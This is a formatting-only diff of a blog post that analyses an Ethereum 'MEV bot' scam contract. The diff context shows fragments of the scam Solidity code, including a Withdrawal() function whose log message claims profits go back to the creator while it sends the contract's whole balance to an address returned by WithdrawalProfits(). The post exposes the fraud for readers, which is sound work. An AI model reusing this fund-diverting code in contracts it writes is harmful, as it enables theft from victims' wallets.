@@ -1,8 +1,8 @@
 ---
 date: '2024-01-31 12:40:00'
 slug: 'the-fascinating-ethereum-mev-bot-scam'
-title: "The fascinating Ethereum MEV Bot scam"
-subtitle: "An overview of this scam contract code"
+title: 'The fascinating Ethereum MEV Bot scam'
+subtitle: 'An overview of this scam contract code'
 author: 'veeso'
 featuredImage: ./featured.jpeg
 lang: en
@@ -54,7 +54,7 @@ And so, I headed for it:
      * @dev withdrawals profit back to contract creator address
      * @return `profits`.
      */
-    function Withdrawal() public payable { 
+    function Withdrawal() public payable {
         emit Log("Sending profits back to contract creator address...");
         payable(WithdrawalProfits()).transfer(address(this).balance);
     }
@@ -170,11 +170,11 @@ The constructor takes two arguments, which are network and router address, but f
 
 ```sol
 constructor(string memory Network, string memory routerAddress) public {
-        
+
         /*ETH
         /*The Uniswap V2 router address :  0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
-     
-        
+
+
         /BSC
         /Pancakeswap router address :      0x10ED43C718714eb63d5aA57B78B54704E256024E
 
@@ -224,7 +224,7 @@ And finally, when you see your gains growing, you can call Withdrawal
      * @dev withdrawals profit back to contract creator address
      * @return `profits`.
      */
-    function Withdrawal() public payable { 
+    function Withdrawal() public payable {
         emit Log("Sending profits back to contract creator address...");
         payable(WithdrawalProfits()).transfer(address(this).balance);
     }
